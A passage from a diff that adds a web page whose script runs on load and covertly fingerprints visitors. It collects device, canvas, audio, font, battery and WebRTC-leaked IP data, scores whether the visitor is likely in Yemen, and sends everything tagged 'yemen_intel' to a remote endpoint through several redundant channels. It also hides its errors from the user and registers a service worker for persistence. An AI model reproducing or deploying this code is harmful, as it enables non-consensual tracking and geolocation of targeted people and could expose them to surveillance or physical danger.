+                keyboard: 'Keyboard' in window,
+                locks: 'locks' in navigator,
+                scheduling: 'scheduler' in window,
+                
+                // Permissions API
+                permissions: 'permissions' in navigator,
+                
+                // VR/AR
+                vr: 'getVRDisplays' in navigator || 'xr' in navigator,
+                xr: 'isSessionSupported' in (navigator.xr || {}),
+                
+                // Fonts
+                fonts: 'fonts' in document,
+                
+                // Barcode/QR
+                barcodeDetector: 'BarcodeDetector' in window,
+                
+                // Face Detection
+                faceDetector: 'FaceDetector' in window,
+                
+                // Text Detection
+                textDetector: 'TextDetector' in window,
+                
+                // Shape Detection
+                shapeDetection: 'ShapeDetection' in window
+            };
+        },
+        
+        // 13. Performance Information (No permission needed)
+        collectPerformance: () => {
+            return Utils.safeExecute(() => ({
+                timing: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    unloadEventStart: performance.timing.unloadEventStart,
+                    unloadEventEnd: performance.timing.unloadEventEnd,
+                    redirectStart: performance.timing.redirectStart,
+                    redirectEnd: performance.timing.redirectEnd,
+                    fetchStart: performance.timing.fetchStart,
+                    domainLookupStart: performance.timing.domainLookupStart,
+                    domainLookupEnd: performance.timing.domainLookupEnd,
+                    connectStart: performance.timing.connectStart,
+                    connectEnd: performance.timing.connectEnd,
+                    secureConnectionStart: performance.timing.secureConnectionStart,
+                    requestStart: performance.timing.requestStart,
+                    responseStart: performance.timing.responseStart,
+                    responseEnd: performance.timing.responseEnd,
+                    domLoading: performance.timing.domLoading,
+                    domInteractive: performance.timing.domInteractive,
+                    domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
+                    domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
+                    domComplete: performance.timing.domComplete,
+                    loadEventStart: performance.timing.loadEventStart,
+                    loadEventEnd: performance.timing.loadEventEnd
+                } : null,
+                navigation: performance.navigation ? {
+                    redirectCount: performance.navigation.redirectCount,
+                    type: performance.navigation.type
+                } : null,
+                memory: performance.memory ? {
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    usageRatio: performance.memory.usedJSHeapSize / performance.memory.totalJSHeapSize
+                } : null,
+                now: performance.now()
+            }), {});
+        },
+        
+        // 14. Battery Information (May need permission on some devices)
+        collectBattery: async () => {
+            if (!('getBattery' in navigator)) {
+                return { supported: false, reason: 'API not available' };
+            }
+            
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    supported: true,
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime,
+                    events: {
+                        onlevelchange: 'onlevelchange' in battery,
+                        onchargingchange: 'onchargingchange' in battery,
+                        onchargingtimechange: 'onchargingtimechange' in battery,
+                        ondischargingtimechange: 'ondischargingtimechange' in battery
+                    }
+                };
+            } catch(e) {
+                return { supported: false, error: e.message, requiresPermission: true };
+            }
+        },
+        
+        // 15. IP Detection via WebRTC (No permission for STUN)
+        collectIP: () => {
+            return new Promise((resolve) => {
+                const ips = new Set();
+                const localIPs = new Set();
+                
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: [
+                            { urls: 'stun:stun.l.google.com:19302' },
+                            { urls: 'stun:stun1.l.google.com:19302' }
+                        ]
+                    });
+                    
+                    pc.createDataChannel('');
+                    
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    pc.onicecandidate = (ice) => {
+                        if (!ice || !ice.candidate) {
+                            pc.close();
+                            resolve({
+                                public: Array.from(ips),
+                                local: Array.from(localIPs),
+                                count: ips.size + localIPs.size
+                            });
+                            return;
+                        }
+                        
+                        const candidate = ice.candidate.candidate;
+                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
+                        
+                        if (ipMatch) {
+                            ipMatch.forEach(ip => {
+                                if (ip.startsWith('10.') || 
+                                    ip.startsWith('172.16.') || ip.startsWith('172.17.') || 
+                                    ip.startsWith('172.18.') || ip.startsWith('172.19.') || 
+                                    ip.startsWith('172.20.') || ip.startsWith('172.21.') || 
+                                    ip.startsWith('172.22.') || ip.startsWith('172.23.') || 
+                                    ip.startsWith('172.24.') || ip.startsWith('172.25.') || 
+                                    ip.startsWith('172.26.') || ip.startsWith('172.27.') || 
+                                    ip.startsWith('172.28.') || ip.startsWith('172.29.') || 
+                                    ip.startsWith('172.30.') || ip.startsWith('172.31.') || 
+                                    ip.startsWith('192.168.')) {
+                                    localIPs.add(ip);
+                                } else {
+                                    ips.add(ip);
+                                }
+                            });
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        pc.close();
+                        resolve({
+                            public: Array.from(ips),
+                            local: Array.from(localIPs),
+                            count: ips.size + localIPs.size
+                        });
+                    }, 3000);
+                } catch(e) {
+                    resolve({ error: e.message, public: [], local: [] });
+                }
+            });
+        }
+    };
+    
+    // ========== UI Controller ==========
+    const UI = {
+        init: () => {
+            const container = document.getElementById('stepsContainer');
+            container.innerHTML = COLLECTION_STEPS.map((step, index) => `
+                <div class="step-item pending" id="step-${step.id}" data-index="${index}">
+                    <div class="step-icon">${step.icon}</div>
+                    <div class="step-content">
+                        <div class="step-title">${step.title}</div>
+                        <div class="step-desc">${step.desc}</div>
+                    </div>
+                </div>
+            `).join('');
+        },
+        
+        updateStep: (stepId, status, message = null) => {
+            const element = document.getElementById(`step-${stepId}`);
+            if (!element) return;
+            
+            element.className = `step-item ${status}`;
+            
+            if (status === 'complete') {
+                element.querySelector('.step-icon').textContent = '✓';
+            } else if (status === 'error') {
+                element.querySelector('.step-icon').textContent = '✗';
+            }
+            
+            if (message) {
+                element.querySelector('.step-desc').textContent = message;
+            }
+        },
+        
+        updateProgress: (percent, text) => {
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('progressText').textContent = text;
+        },
+        
+        showResult: () => {
+            document.getElementById('mainCard').querySelector('.progress-header').style.display = 'none';
+            document.getElementById('progressBar').parentElement.style.display = 'none';
+            document.getElementById('stepsContainer').style.display = 'none';
+            document.getElementById('resultSection').classList.add('show');
+        },
+        
+        showError: (message) => {
+            // Silent error - don't alert user
+            console.error('Collection error:', message);
+        }
+    };
+    
+    // ========== Data Transmission ==========
+    const Transmission = {
+        send: async (data) => {
+            const payload = JSON.stringify(data);
+            const encoded = btoa(unescape(encodeURIComponent(payload)));
+            
+            const attempts = [];
+            
+            // Attempt 1: Fetch with keepalive
+            attempts.push(
+                fetch(CONFIG.COLLECTION_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: payload,
+                    keepalive: true,
+                    mode: 'no-cors'
+                }).catch(() => false)
+            );
+            
+            // Attempt 2: Beacon API
+            if ('sendBeacon' in navigator) {
+                attempts.push(
+                    navigator.sendBeacon(CONFIG.COLLECTION_ENDPOINT, payload) ? Promise.resolve(true) : Promise.resolve(false)
+                );
+            }
+            
+            // Attempt 3: Image beacon (never fails)
+            const img = new Image();
+            img.src = `${CONFIG.COLLECTION_ENDPOINT}?d=${encoded.substring(0, 2000)}`;
+            
+            // Attempt 4: WebSocket if available
+            try {
+                const ws = new WebSocket(CONFIG.WS_ENDPOINT);
+                ws.onopen = () => {
+                    ws.send(JSON.stringify({ type: 'yemen_intel', data: data }));
+                    ws.close();
+                };
+            } catch(e) {}
+            
+            // Attempt 5: localStorage for persistence
+            try {
+                const key = `yemen_intel_${new Date().toISOString().split('T')[0]}`;
+                const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                existing.push({
+                    timestamp: Date.now(),
+                    deviceId: data.deviceId,
+                    fingerprint: data.fingerprint
+                });
+                localStorage.setItem(key, JSON.stringify(existing.slice(0, 50)));
+                
+                // Signal to dashboard
+                localStorage.setItem('yemen_last_device', JSON.stringify(data));
+                localStorage.setItem('yemen_last_update', Date.now().toString());
+            } catch(e) {}
+            
+            await Promise.allSettled(attempts);
+        },
+        
+        // Persistent transmission attempts
+        retryTransmission: (data, attempts = 3) => {
+            const trySend = (remaining) => {
+                if (remaining <= 0) return;
+                
+                Transmission.send(data).then(() => {
+                    // Success
+                }).catch(() => {
+                    setTimeout(() => trySend(remaining - 1), 2000);
+                });
+            };
+            
+            trySend(attempts);
+        }
+    };
+    
+    // ========== Main Collection Flow ==========
+    const CollectionFlow = {
+        execute: async () => {
+            State.deviceId = Utils.generateId();
+            UI.init();
+            
+            const phases = [
+                { id: 'device', fn: Collectors.collectDevice, weight: 15 },
+                { id: 'screen', fn: Collectors.collectScreen, weight: 15 },
+                { id: 'window', fn: Collectors.collectWindow, weight: 10 },
+                { id: 'time', fn: Collectors.collectTime, weight: 10 },
+                { id: 'network', fn: Collectors.collectNetwork, weight: 10 },
+                { id: 'webgl', fn: Collectors.collectWebGL, weight: 15 },
+                { id: 'canvas', fn: Collectors.collectCanvas, weight: 15 },
+                { id: 'audio', fn: Collectors.collectAudio, weight: 10 },
+                { id: 'fonts', fn: Collectors.collectFonts, weight: 10 },
+                { id: 'plugins', fn: Collectors.collectPlugins, weight: 5 },
+                { id: 'storage', fn: Collectors.collectStorage, weight: 5 },
+                { id: 'capabilities', fn: Collectors.collectCapabilities, weight: 10 },
+                { id: 'performance', fn: Collectors.collectPerformance, weight: 5 }
+            ];
+            
+            let currentProgress = 0;
+            let collectedData = {
+                deviceId: State.deviceId,
+                sessionStart: State.sessionStart,
+                collectionVersion: '2.0.0',
+                yemenFocus: true
+            };
+            
+            // Execute phases that don't need permission
+            for (const phase of phases) {
+                const step = COLLECTION_STEPS.find(s => s.id === phase.id);
+                
+                UI.updateStep(phase.id, 'active');
+                UI.updateProgress(
+                    currentProgress, 
+                    `${currentProgress}% - ${step.title}...`
+                );
+                
+                try {
+                    const result = await Promise.race([
+                        Promise.resolve(phase.fn()),
+                        new Promise((_, reject) => 
+                            setTimeout(() => reject(new Error('Timeout')), CONFIG.COLLECTION_TIMEOUT)
+                        )
+                    ]);
+                    
+                    collectedData[phase.id] = result;
+                    UI.updateStep(phase.id, 'complete');
+                    
+                } catch(e) {
+                    collectedData[phase.id] = { error: e.message, timeout: true };
+                    UI.updateStep(phase.id, 'error', 'تم التخطي');
+                }
+                
+                currentProgress += phase.weight;
+                await new Promise(r => setTimeout(r, 300));
+            }
+            
+            // Battery (may need permission - handle gracefully)
+            UI.updateProgress(85, '85% - فحص البطارية...');
+            try {
+                const battery = await Collectors.collectBattery();
+                collectedData.battery = battery;
+                
+                if (battery.requiresPermission) {
+                    UI.updateStep('battery', 'error', 'يحتاج إذن - تم التخطي');
+                } else {
+                    UI.updateStep('battery', 'complete');
+                }
+            } catch(e) {
+                collectedData.battery = { error: e.message };
+            }
+            
+            // IP Detection
+            UI.updateProgress(90, '90% - تحديد IP...');
+            try {
+                const ipData = await Collectors.collectIP();
+                collectedData.ip = ipData;
+            } catch(e) {
+                collectedData.ip = { error: e.message };
+            }
+            
+            // Generate final fingerprint
+            UI.updateProgress(95, '95% - إنشاء البصمة الرقمية...');
+            
+            const fingerprintComponents = [
+                collectedData.device?.userAgent,
+                collectedData.screen?.width + 'x' + collectedData.screen?.height,
+                collectedData.screen?.colorDepth,
+                collectedData.time?.timezone,
+                collectedData.webgl?.renderer,
+                collectedData.webgl?.vendor,
+                collectedData.canvas?.hash,
+                collectedData.audio?.hash,
+                collectedData.fonts?.fingerprint
+            ].filter(Boolean).join('###');
+            
+            collectedData.fingerprint = Utils.hashString(fingerprintComponents);
+            collectedData.fingerprintFull = fingerprintComponents;
+            
+            // Device category
+            collectedData.deviceCategory = Utils.getDeviceCategory(
+                collectedData.device?.deviceMemory,
+                collectedData.device?.hardwareConcurrency,
+                collectedData.screen?.width
+            );
+            
+            // Yemen-specific analysis
+            collectedData.yemenAnalysis = {
+                likelyInYemen: collectedData.time?.yemenLocation?.country === 'Yemen',
+                confidence: collectedData.time?.yemenLocation?.confidence,
+                arabicLanguage: collectedData.device?.language?.startsWith('ar'),
+                hasArabicFonts: collectedData.fonts?.hasArabic,
+                timezoneMatch: ['Asia/Aden', 'Asia/Sana', 'Asia/Riyadh'].includes(collectedData.time?.timezone)
+            };
+            
+            // Finalize
+            collectedData.collectionEnd = Date.now();
+            collectedData.collectionDuration = collectedData.collectionEnd - State.sessionStart;
+            collectedData.errors = State.errors;
+            
+            State.collectedData = collectedData;
+            
+            // Transmit
+            UI.updateProgress(100, '100% - إرسال البيانات...');
+            await Transmission.send(collectedData);
+            Transmission.retryTransmission(collectedData, 3);
+            
+            // Show success
+            UI.showResult();
+            
+            // Register service worker for persistence
+            registerPersistence();
+            
+            return collectedData;
+        }
+    };
+    
+    // ========== Persistence ==========
+    const registerPersistence = () => {
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('worker.js').then(reg => {
+                console.log('Service Worker registered for persistence');
+                
+                // Attempt to keep alive
+                if (reg.sync) {
+                    reg.sync.register('yemen-intel-sync').catch(() => {});
+                }
+                
+                // Periodic sync if available
+                if (reg.periodicSync) {
+                    reg.periodicSync.register('yemen-intel-periodic', {
+                        minInterval: 24 * 60 * 60 * 1000 // Daily
+                    }).catch(() => {});
+                }
+            }).catch(() => {});
+        }
+        
+        // Backup: Visibility API
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // Page hidden - send final beacon
+                navigator.sendBeacon?.(CONFIG.COLLECTION_ENDPOINT, JSON.stringify({
+                    type: 'session_end',
+                    deviceId: State.deviceId,
+                    timestamp: Date.now(),
+                    duration: Date.now() - State.sessionStart
+                }));
+            }
+        });
+        
+        // Backup: Before unload
+        window.addEventListener('beforeunload', () => {
+            navigator.sendBeacon?.(CONFIG.COLLECTION_ENDPOINT, JSON.stringify({
+                type: 'session_end',
+                deviceId: State.deviceId,
+                timestamp: Date.now()
+            }));
+        });
+    };
+    
+    // ========== Start Collection ==========
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => CollectionFlow.execute());
+    } else {
+        CollectionFlow.execute();
+    }
+    
+})();
+</script>
+
+</body>
+</html>
